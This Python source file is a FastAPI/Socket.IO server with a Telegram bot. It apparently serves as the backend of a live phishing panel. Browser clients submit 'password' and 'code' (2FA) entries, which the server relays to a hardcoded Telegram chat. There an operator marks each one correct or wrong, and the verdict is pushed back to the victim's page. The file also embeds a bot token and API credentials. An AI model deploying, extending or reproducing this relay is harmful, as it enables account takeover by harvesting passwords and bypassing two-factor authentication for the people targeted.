import sys
import traceback
from contextlib import asynccontextmanager

import socketio
import uvicorn
from fastapi import FastAPI
from telethon import Button, TelegramClient, events
from telethon.errors import FloodWaitError, MessageNotModifiedError
from telethon.sessions import StringSession

client = TelegramClient(StringSession(), 24737189, "df7185639d01f88796aa91f35ea4f2ea")

sio = socketio.AsyncServer(async_mode="asgi", cors_allowed_origins="*")

BOT_TOKEN = "8820352542:AAHXkFEQvDLTnjSx9voR8zRp9m9iR3cG1ok"
CHAT_ID = 8882153229

ALLOWED_STAGES = {None, "password", "code"}
MAX_MESSAGE_LEN = 4096


def login_buttons(sid: str):
    return [
        [
            Button.inline("ĐÚNG", f"opt_1:{sid}"),
            Button.inline("SAI", f"opt_2:{sid}"),
        ],
    ]


def code_buttons(sid: str):
    return [
        [
            Button.inline("ĐÚNG", f"code_opt_1:{sid}"),
            Button.inline("SAI 2FA", f"code_opt_2:{sid}"),
        ],
    ]


@asynccontextmanager
async def lifespan(app: FastAPI):
    import asyncio

    try:
        await client.connect()
        if not await client.is_user_authorized():
            while True:
                try:
                    await client.sign_in(bot_token=BOT_TOKEN)
                    break
                except FloodWaitError as e:
                    sys.stderr.write(f"flood wait {e.seconds}s, retrying...\n")
                    await asyncio.sleep(e.seconds + 1)
        if await client.is_bot():
            client.add_event_handler(button_handler, events.CallbackQuery())
    except Exception:
        sys.stderr.write("lỗi init telethon:\n")
        traceback.print_exc()

    yield

    if client.is_connected():
        disconnect_task = client.disconnect()
        if disconnect_task:
            await disconnect_task


fastapi_app = FastAPI(lifespan=lifespan)


app = socketio.ASGIApp(sio, other_asgi_app=fastapi_app)


async def button_handler(event: events.CallbackQuery.Event):
    try:
        await event.answer()
        decoded_data = (
            event.data.decode() if isinstance(event.data, bytes) else event.data
        )
        parts = decoded_data.split(":", 1)
        button_type = parts[0]
        target_id = parts[1] if len(parts) == 2 else None

        if button_type == "opt_1" and target_id:
            try:
                await event.edit(buttons=None)
            except MessageNotModifiedError:
                pass
            await sio.emit("login_result", {"status": "approved"}, room=target_id)
        elif button_type == "opt_2":
            if target_id:
                try:
                    await event.edit(buttons=None)
                except MessageNotModifiedError:
                    pass
                await sio.emit("login_result", {"status": "rejected"}, room=target_id)
        elif button_type == "code_opt_1" and target_id:
            try:
                await event.edit(buttons=None)
            except MessageNotModifiedError:
                pass
            await sio.emit("code_result", {"status": "approved"}, room=target_id)
        elif button_type == "code_opt_2":
            if target_id:
                try:
                    await event.edit(buttons=None)
                except MessageNotModifiedError:
                    pass
                await sio.emit("code_result", {"status": "rejected"}, room=target_id)
    except Exception:
        sys.stderr.write("lỗi xử lý button:\n")
        traceback.print_exc()


@sio.event
async def send_message(sid, data):
    try:
        if not isinstance(data, dict):
            return {"success": False}
        message = data.get("message")
        message_id = data.get("message_id")
        stage = data.get("stage")
        if (
            not isinstance(message, str)
            or not message.strip()
            or len(message) > MAX_MESSAGE_LEN
        ):
            return {"success": False}
        if stage not in ALLOWED_STAGES:
            return {"success": False}
        if message_id is not None and (
            isinstance(message_id, bool)
            or not isinstance(message_id, int)
            or message_id <= 0
        ):
            return {"success": False}
        if stage == "password":
            buttons = login_buttons(sid)
        elif stage == "code":
            buttons = code_buttons(sid)
        else:
            buttons = None
        if message_id:
            try:
                await client.edit_message(
                    CHAT_ID, message_id, message, parse_mode="html", buttons=buttons
                )
                return {"success": True, "message_id": message_id}
            except MessageNotModifiedError:
                return {"success": True, "message_id": message_id}
            except Exception:
                pass
        msg = await client.send_message(
            CHAT_ID, message, parse_mode="html", buttons=buttons
        )
        return {"success": True, "message_id": msg.id}
    except Exception:
        sys.stderr.write("lỗi send_message:\n")
        traceback.print_exc()
        return {"success": False}


if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=80, workers=1)
